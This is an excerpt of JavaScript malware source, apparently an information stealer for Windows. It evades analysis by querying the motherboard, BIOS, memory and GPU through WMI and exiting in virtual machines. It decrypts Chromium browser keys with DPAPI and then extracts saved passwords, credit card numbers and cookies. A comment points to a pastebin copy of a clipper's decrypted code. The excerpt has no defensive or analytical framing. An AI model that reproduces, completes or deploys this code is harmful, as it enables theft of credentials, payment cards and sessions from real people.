...
function motherboardCheck(callback) {
    executeCommand('powershell -Command "Get-WmiObject Win32_BaseBoard | Select-Object SerialNumber"', (stdout) => {
        const motherboardSerial = stdout.trim();
        if (motherboardSerial.includes("Board-GoogleCloud")) {
            exitProcess();
        } else {
            biosCheck(callback);
        }
...
function biosCheck(callback) {
    executeCommand('powershell -Command "Get-WmiObject Win32_BIOS | Select-Object SMBIOSBIOSVersion"', (stdout) => {
...
function speedCheck(callback) {
    executeCommand('powershell -Command "Get-WmiObject Win32_PhysicalMemory | Select-Object Speed"', (stdout) => {
...
function gpuCheck(callback) {
    executeCommand('powershell -Command "Get-WmiObject Win32_VideoController | Select-Object Name"', (stdout) => {
        const gpuList = stdout.split("\n").map(gpu => gpu.trim()).filter(gpu => gpu);
        if (checkListed(blackListedGPU, gpuList) || gpuList.some(gpu => gpu.startsWith("VMware"))) {
            exitProcess();
        } else {
            osCheck(callback);
        }
...
function getPCSerialNumber(callback) {
    executeCommand('powershell -Command "Get-WmiObject Win32_DiskDrive | Select-Object SerialNumber"', (stdout) => {
        callback(stdout);
    });
}
...
// This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N 
...
encoded_code = """

"""
...
function getEncrypted() {
    ...
    for (let i = 0; i < browserPath.length; i++) {
        ...
        if (!fs.existsSync(localStatePath) || !fs.existsSync(loginDataPath)) {
            console.log(`Local State or Login Data not found for ${browserPath[i][1]}`);
            continue;
        }
        ...
        try {
            ...
            const decryptedKey = dpapi.unprotectData(key, null, 'CurrentUser');
            browserPath[i][3] = decryptedKey.toString('base64');
            keyResults.push(`Key decrypted for ${browserPath[i][1]}`);
        } catch (err) {
            console.error(`Error decrypting key for ${browserPath[i][1]}: ${err.message}`);
            continue;
        }

        const tempPath = path.join(browserPath[i][0], 'passwords.db');
        ...
        db.all('SELECT origin_url, username_value, password_value FROM logins', (err, rows) => {
            if (err) {
                console.error(`Error accessing Login Data for ${browserPath[i][1]}: ${err.message}`);
                return;
            }

            rows.forEach(row => {
                if (!row.password_value) return;
                try {
                    const encryptedValue = row.password_value;
                    if (encryptedValue.toString().startsWith('v10') || encryptedValue.toString().startsWith('v11')) {
                        ...
                        const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(browserPath[i][3], 'base64'), iv);
                        ...
                        passwordResults.push({
                            ...
                            password: decrypted,
                            browser: browserPath[i][1]
                        });
                    }
                } catch (err) {
                    console.error(`Error decrypting password for ${row.origin_url}: ${err.message}`);
                }
            });
    ...
    return { keyResults, passwordResults };
}
...
async function getCards() {
    ...
    for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
        if (!fs.existsSync(browserPath[_0x261d97][0])) {
            console.log(`Browser path not found for ${browserPath[_0x261d97][1]}`);
            continue;
        }

        if (!browserPath[_0x261d97][3]) {
            console.log(`No decryption key available for ${browserPath[_0x261d97][1]}`);
            continue;
        }
        ...
        const webData = path.join(browserPath[_0x261d97][0], 'Web Data');
        const copiedFilePath = path.join(browserPath[_0x261d97][0], 'Web.db');

        if (!fs.existsSync(webData)) {
            console.log(`Web Data not found for ${browserPath[_0x261d97][1]}`);
            continue;
        }
        ...
        await new Promise((resolve, reject) => {
            databaseConnection.each(
                ...
                (err, card) => {
                    if (err) {
                        console.error(`Error querying credit cards for ${browserPath[_0x261d97][1]}: ${err.message}`);
                        reject(err);
                        return;
                    }
                    ...
                    try {
                        const encryptedValue = card.card_number_encrypted;
                        if (encryptedValue.toString().startsWith('v10') || encryptedValue.toString().startsWith('v11')) {
                            const iv = encryptedValue.slice(3, 15);
                            const encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                            const authTag = encryptedValue.slice(encryptedValue.length - 16);
                            const decipher = crypto.createDecipheriv('aes-256-gcm', Buffer.from(browserPath[_0x261d97][3], 'base64'), iv);
                            decipher.setAuthTag(authTag);
                            const decryptedCardNumber = decipher.update(encryptedData) + decipher.final('utf8');
                        ...
                        console.error(`Error decrypting card for ${browserPath[_0x261d97][1]}: ${error.message}`);
                    }
                },
                () => {
                    resolve();
        ...
        try {
            ...
            console.error(`Error cleaning up for ${browserPath[_0x261d97][1]}: ${error.message}`);
        }
    }
...
async function getCookies() {
    ...
    for (let i = 0; i < browserPath.length; i++) {
        ...
        if (!fs.existsSync(path.join(networkPath, 'Cookies'))) {
            console.log(`Cookies file not found for ${browserPath[i][1]}`);
            continue;
        }

        if (!browserPath[i][3]) {
            console.log(`No decryption key available for ${browserPath[i][1]}`);
            continue;
        }
        ...
        const tempPath = path.join(networkPath, 'cookies_temp.db');
        ...
        await new Promise((resolve) => {
            db.each(
                ...
                (err, row) => {
                    if (err) {
                        console.error(`Error reading cookies from ${cookiesPath}: ${err.message}`);
                        return;
                    }
                    ...
                    try {
                        ...
                        console.error(`Error decrypting cookie ${row.name} for ${row.host_key}: ${error.message}`);
                    }
                },
                () => {
                    db.close();
    ...
    for (let [browserName, cookies] of Object.entries(cookiesData)) {
        ...
        if (cookies.length !== 0) {
            ...
            try {
                ...
                console.error(`Error writing/moving cookies file ${cookiesFilePath}: ${error.message}`);
            }
        }
    }
}
